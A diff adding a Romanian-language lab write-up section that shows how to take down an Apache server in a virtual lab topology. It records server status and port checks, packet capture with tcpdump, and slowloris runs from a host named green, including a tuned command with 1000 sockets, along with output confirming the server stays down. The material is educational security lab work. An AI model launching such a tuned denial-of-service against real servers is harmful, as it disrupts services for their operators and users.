@@ -331,4 +331,129 @@ despre care pot afla mai multe la URL-ul <https://www.shodan.io/host/35.231.129.
 
 ## Task 8 | Rulare **Dos** (Denial of Service) pe un server web
 
-TODO:
+
+```sh
+root@red:~# /etc/init.d/apache2 status
+```
+
+
+```
+● apache2.service - The Apache HTTP Server
+     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: enabled)
+     Active: active (running) since Wed 2024-12-11 20:46:37 UTC; 2h 11min ago
+       Docs: https://httpd.apache.org/docs/2.4/
+    Process: 594 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
+   Main PID: 605 (apache2)
+        CPU: 219ms
+     CGroup: /system.slice/apache2.service
+             ├─605 /usr/sbin/apache2 -k start
+             ├─606 /usr/sbin/apache2 -k start
+             └─607 /usr/sbin/apache2 -k start
+
+Dec 11 20:46:37 red systemd[1]: Starting The Apache HTTP Server...
+Dec 11 20:46:37 red apachectl[604]: AH00558: apache2: Could not reliably determine the server's fully qual… message
+Dec 11 20:46:37 red systemd[1]: Started The Apache HTTP Server.
+Hint: Some lines were ellipsized, use -l to show in full.
+```
+
+> Observ **PID**-ul (ID-ul procesului pentru server): **605**.
+
+
+```sh
+# Flag-ul "-p" specifica procesul care a pornit conexiunea respectiva
+root@red:~# netstat -tulpn
+```
+```
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      605/apache2         
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      142/inetd           
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      44/sshd: /usr/sbin/ 
+tcp6       0      0 :::22                   :::*                    LISTEN      44/sshd: /usr/sbin/ 
+tcp6       0      0 :::21                   :::*                    LISTEN      43/vsftpd           
+```
+
+
+> Deci, serverul ruleaza cu **PID**-ul **605**, pe **port**-ul **80** (bine de stiut numarul portului).
+
+
+
+```sh
+root@host:~# tcpdump -i veth-red -n
+```
+
+```sh
+# Mai bine, pentru a salva intr-un fisier si a-l vizualiza in WireShark
+root@host:~# tcpdump -i veth-red -n -vv -w dos-packets.pcap
+```
+
+
+Pe orice statie, vizualizez browser-ul in terminal, spre exemplu:
+
+```sh
+# Intr-un alt terminal, afisez browser-ul
+root@host:~# elinks http://192.168.1.2/
+```
+
+
+Acum, pe **green**, incepe partea interesanta.
+
+
+```sh
+root@green:~# slowloris https://192.168.1.2
+```
+```
+[11-12-2024 22:56:13] Attacking https://192.168.1.2 with 150 sockets.
+[11-12-2024 22:56:13] Creating sockets...
+[11-12-2024 22:56:13] Sending keep-alive headers...
+[11-12-2024 22:56:13] Socket count: 0
+[11-12-2024 22:56:13] Creating 150 new sockets...
+```
+
+
+In manualul de utilizator, spune urmatoarele:
+
+* -p, --port
+* * Port of webserver, usually 80
+* -s, --sockets
+* * Number of sockets to use in the test
+* -v, --verbose
+* * Increases logging (output on terminal)
+* -ua, --randuseragents
+* * Randomizes user-agents with each request
+* -x, --useproxy
+* * Use a SOCKS5 proxy for connecting
+* --https
+* * Use HTTPS for the requests
+* --sleeptime
+* * Time to sleep between each header sent
+
+
+Deci, pot folosi o abordare mai puternica, deschizand mai multe conexiuni, intr-un timp cat mai mic,
+explicit doar pe port-ul serverului (port **80**).
+
+```sh
+# Din mai multe terminale (dureaza ceva tho)
+root@green:~# slowloris --port 80 --sockets 1000 -v --sleeptime 1 192.168.1.2
+```
+
+Setez un numar de socket-uri cat mai mare, si un timp cat mai mic intre pachete.
+
+> Aparent, **sleeptime**-ul trebuie sa fie musai **int**.
+
+
+Dupa cateva momente, serverul pica.
+
+...si asa ramane.
+O alta rulare a comenzii `elinks http://192.168.1.2/` imi arata mesajul **Request sent**.
+
+
+![img](Images/Screenshot%20from%202024-12-12%2001-07-22.png)
+
+
+```sh
+# Resetam topologia
+root@host:~# start_lab mitm
+```
+
+
